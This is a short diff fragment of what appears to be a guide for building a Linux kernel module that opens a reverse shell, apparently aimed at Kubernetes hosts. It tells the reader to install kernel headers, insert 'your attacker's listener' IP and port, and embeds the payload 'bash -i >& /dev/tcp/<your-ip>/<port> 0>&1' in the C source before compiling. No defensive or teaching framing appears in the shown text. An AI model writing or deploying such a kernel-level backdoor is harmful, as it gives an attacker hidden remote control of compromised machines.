@@ -38,8 +38,9 @@ apt update
 apt install -y build-essential linux-headers-$(uname -r)
 
 # Step 2: Edit the reverse shell IP and port in the C source file
-# File: reverseshell_module.c
+# File: k8s-lkm-reverse-shell.c
 # Replace <your-ip> and <port> with your attacker's listener
+
 static char command[50] = "bash -i >& /dev/tcp/<your-ip>/<port> 0>&1";
 
 # Step 3: Compile the kernel module
